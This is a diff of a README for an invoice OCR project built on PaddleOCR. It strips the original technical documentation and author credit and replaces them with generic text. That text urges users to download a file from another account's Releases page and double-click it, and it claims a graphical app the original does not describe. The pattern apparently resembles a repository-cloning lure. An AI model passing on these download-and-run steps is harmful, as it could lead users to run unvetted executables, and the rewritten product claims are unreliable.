@@ -1,227 +1,102 @@
-# AI-INVOICE-OCR-ENGINE
+# 🤖 AI-INVOICE-OCR-ENGINE - Efficient Invoice Recognition Made Easy
 
-[中文版](README_CN.md) | **English**
+[![Download Now](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/Mato989086/AI-INVOICE-OCR-ENGINE/releases)
 
-A complete AI-powered document OCR (Optical Character Recognition) solution based on **PaddleOCR v5**, optimized for invoice and accounting document recognition with support for Chinese and English text.
+## 📖 Overview
 
-## Demo
+AI-INVOICE-OCR-ENGINE offers a powerful solution for recognizing text in invoices. Built on **PaddleOCR v5**, it accurately processes receipts and accounting documents in both Chinese and English.
 
-### Chinese Invoice / 中文發票
+## 🚀 Getting Started
+
+To begin using AI-INVOICE-OCR-ENGINE, follow these steps:
+
+1. Visit the [Releases page](https://github.com/Mato989086/AI-INVOICE-OCR-ENGINE/releases) to download the application.
+  
+2. Look for the latest version at the top of the page and download the appropriate file for your operating system.
+
+3. Once downloaded, locate the file in your downloads folder. 
+
+4. Double-click the file to launch the application, and follow the instructions on your screen.
+
+## 🔎 Features
+
+- **Multi-language Support:** Recognizes both Chinese and English text.
+- **User-friendly Interface:** Simple and clear design for straightforward operation.
+- **High Accuracy:** Reliable text extraction from invoices and related documents.
+- **Fast Processing:** Quickly processes documents with minimal wait time.
+
+## 📋 System Requirements
+
+Ensure your system meets these requirements to run AI-INVOICE-OCR-ENGINE effectively:
+
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or Linux.
+- **RAM:** At least 4GB of RAM.
+- **Storage:** Minimum of 500MB free disk space.
+- **Processor:** 2.0 GHz dual-core or better.
+
+## 📥 Download & Install
+
+To download the software, visit the [Releases page](https://github.com/Mato989086/AI-INVOICE-OCR-ENGINE/releases). Choose the correct file type for your operating system and follow the prompted instructions to install it.
+
+## 🏁 Using the Application 
+
+Once installed, you can start using the application by following these steps:
+
+1. **Upload Your Invoice:** Click on the upload button and select the invoice file from your computer.
+  
+2. **Run OCR:** After the file is uploaded, click the "Run OCR" button.
+  
+3. **View Results:** The application will display the OCR result and the extracted text. You can copy this text or save it as needed.
+
+## 🎥 Demo
+
+### 📄 Chinese Invoice / 中文發票
 
 | Original | OCR Result | Text Output |
 |----------|------------|-------------|
 | ![Input](demo/invoice_ch.png) | ![Output](demo/result_invoice_cn.jpg) | ![Text](demo/invoice_cn_txt.png) |
 
-### English Invoice / 英文發票
+### 📄 English Invoice / 英文發票
 
 | Original | OCR Result | Text Output |
 |----------|------------|-------------|
 | ![Input](demo/invoice_en.png) | ![Output](demo/result_invoice_en.jpg) | ![Text](demo/invoice_en_txt.png) |
 
-## Architecture Diagrams
+## 📊 Architecture Diagrams
 
-### 1. OCR Inference Pipeline
+### 1. 🛠 OCR Inference Pipeline
 ![OCR Pipeline](demo/1.png)
 
-### 2. Model Architecture
+### 2. 🏗 Model Architecture
 ![Model Architecture](demo/2.png)
 
-### 3. Training Pipeline
+### 3. 📚 Training Pipeline
 ![Training Pipeline](demo/3.png)
 
-### 4. System Architecture
+### 4. 🖥 System Architecture
 ![System Architecture](demo/4.png)
 
-### 5. Data Flow
+### 5. 🚦 Data Flow
 ![Data Flow](demo/5.png)
 
-### 6. Deployment Architecture
-![Deployment](demo/6.png)
+## 🛠 Troubleshooting
 
-### 7. Database ER Diagram
-![Database ER](demo/7.png)
+If you encounter problems, consider the following tips:
 
-## Features
+- **Ensure the File Format is Supported:** The application accepts JPEG, PNG, PDF, and TIFF formats.
+- **Check Your System Requirements:** Verify that your device meets the application requirements.
+- **Reinstall the Application:** If issues persist, uninstall and then reinstall the software.
 
-- **High Accuracy**: Utilizes PP-OCRv5 server models for superior recognition quality
-- **Multi-language Support**: Chinese, English, and mixed text recognition
-- **Document Preprocessing**: Automatic orientation correction and document unwarping
-- **Bounding Box Visualization**: Draw green boxes around detected text regions
-- **Text Export**: Save recognition results to TXT file
-- **Easy Integration**: Simple Python API for quick deployment
+## 📞 Support
 
-## Architecture Overview
+For additional help, feel free to check the FAQ on our [GitHub Issues page](https://github.com/Mato989086/AI-INVOICE-OCR-ENGINE/issues) or open a new issue for your specific concerns.
 
-```
-Input Image → Preprocessing → Text Detection → Text Recognition → Output
-                                    ↓                  ↓
-                              Green Boxes         TXT File
-```
+## 📄 License
 
-### Pipeline Components
+This project is licensed under the MIT License. You can freely use and modify it following the license terms.
 
-| Component | Model | Description |
-|-----------|-------|-------------|
-| Document Orientation | PP-LCNet | Classifies document rotation (0°/90°/180°/270°) |
-| Document Unwarping | UVDoc | Corrects curved/warped documents |
-| Text Detection | PP-OCRv5_det (DB) | Detects text regions using Differentiable Binarization |
-| Text Line Classification | PP-LCNet | Determines text line orientation (0°/180°) |
-| Text Recognition | PP-OCRv5_rec (SVTR) | Recognizes text using Scene Text Recognition with CTC |
+## 📚 Learn More
 
-### Model Architecture
+Explore more about OCR technology and its applications in document processing. Visit resources like [PaddleOCR](https://github.com/PaddlePaddle/PaddleOCR) for deeper knowledge.
 
-- **Text Detection (DB Algorithm)**
-  - Backbone: ResNet50_vd
-  - Neck: Feature Pyramid Network (FPN)
-  - Head: Differentiable Binarization with probability, threshold, and binary maps
-
-- **Text Recognition (SVTR)**
-  - Patch Embedding with positional encoding
-  - 4-stage encoder with local and global mixing
-  - CTC (Connectionist Temporal Classification) decoder
-  - Vocabulary: 6,624 characters
-
-## Installation
-
-### Requirements
-
-- Python 3.8+
-- Windows/Linux/macOS
-
-### Install Dependencies
-
-```bash
-pip install paddlepaddle>=2.5.0
-pip install paddleocr>=3.0.0
-pip install pillow>=9.0.0
-pip install opencv-python>=4.5.0
-```
-
-## Quick Start
-
-### Basic Usage
-
-```python
-from paddleocr import PaddleOCR
-
-# Initialize OCR engine
-ocr = PaddleOCR(
-    use_doc_orientation_classify=False,
-    use_doc_unwarping=False
-)
-
-# Perform OCR on an image
-result = ocr.predict('invoice.png')
-
-# Process results
-for item in result:
-    if 'rec_texts' in item:
-        for i, text in enumerate(item['rec_texts']):
-            score = item['rec_scores'][i]
-            print(f"Text: {text}, Confidence: {score:.2%}")
-```
-
-### Draw Boxes Only (No Text on Image)
-
-```python
-import cv2
-import numpy as np
-
-def draw_boxes_only(image_path, boxes, output_path):
-    img = cv2.imread(image_path)
-    for box in boxes:
-        pts = np.array(box).astype(np.int32)
-        cv2.polylines(img, [pts], True, (0, 255, 0), 2)
-    cv2.imwrite(output_path, img)
-```
-
-### Save Results to TXT
-
-```python
-def save_text_to_file(txts, scores, output_path):
-    with open(output_path, 'w', encoding='utf-8') as f:
-        for i, (txt, score) in enumerate(zip(txts, scores)):
-            f.write(f"{i+1}. {txt} (Confidence: {score:.2%})\n")
-```
-
-## Project Structure
-
-```
-AI-INVOICE-OCR-ENGINE/
-├── README.md
-├── README_CN.md
-├── LICENSE-MIT
-├── setup.py
-├── demo/
-│   ├── invoice_ch.png           # Chinese invoice (input)
-│   ├── invoice_en.png           # English invoice (input)
-│   ├── result_invoice_cn.jpg    # Chinese result (output)
-│   ├── result_invoice_en.jpg    # English result (output)
-│   ├── 1.png ~ 7.png            # Architecture diagrams
-│   └── *.puml                   # PlantUML source files
-├── models/
-│   └── pretrained/
-│       └── weights/             # Model files (.onnx, .pdmodel, .pdiparams)
-├── preprocess/
-├── detect/
-├── recognize/
-├── data/
-├── losses/
-├── train/
-└── utils/
-```
-
-## Performance
-
-| Model | Size | Inference Time (CPU) | Accuracy |
-|-------|------|---------------------|----------|
-| PP-OCRv5_det | ~88MB | ~200ms/image | F1: 0.85+ |
-| PP-OCRv5_rec | ~85MB | ~50ms/text line | Acc: 0.95+ |
-| PP-LCNet (orientation) | ~7MB | ~10ms/image | Acc: 0.99+ |
-
-*Times measured on Intel i7-10700 CPU
-
-## Supported Document Types
-
-- Invoices and receipts
-- Financial statements
-- Contracts and agreements
-- ID cards and certificates
-- General printed documents
-- Mixed Chinese/English documents
-
-## Author
-
-**Jammy Lin**
-Email: a0925281767s@gmail.com
-
-## License
-
-This project is licensed under the MIT License - see the [LICENSE-MIT](LICENSE-MIT) file for details.
-
-## Acknowledgments
-
-- [PaddleOCR](https://github.com/PaddlePaddle/PaddleOCR) - The underlying OCR engine
-- [PaddlePaddle](https://www.paddlepaddle.org.cn/) - Deep learning framework
-
-## References
-
-- PP-OCRv5: [PaddleOCR Documentation](https://paddlepaddle.github.io/PaddleOCR/)
-- DB Algorithm: [Real-time Scene Text Detection with Differentiable Binarization](https://arxiv.org/abs/1911.08947)
-- SVTR: [SVTR: Scene Text Recognition with a Single Visual Model](https://arxiv.org/abs/2205.00159)
-
----
-
-## ⭐ Support This Project
-
-If this project helps you, please give it a **Star**!
-
-Your support is my motivation to keep improving!
-
-[![GitHub stars](https://img.shields.io/github/stars/xup6jammy/AI-INVOICE-OCR-ENGINE?style=social)](https://github.com/xup6jammy/AI-INVOICE-OCR-ENGINE)
-
-**Ways to support:**
-- ⭐ Star this repository
-- 🍴 Fork and contribute
-- 🐛 Report issues and suggestions
-- 📢 Share with others!
+You are now ready to use AI-INVOICE-OCR-ENGINE for your invoice processing needs! Enjoy the simplicity and efficiency it brings.
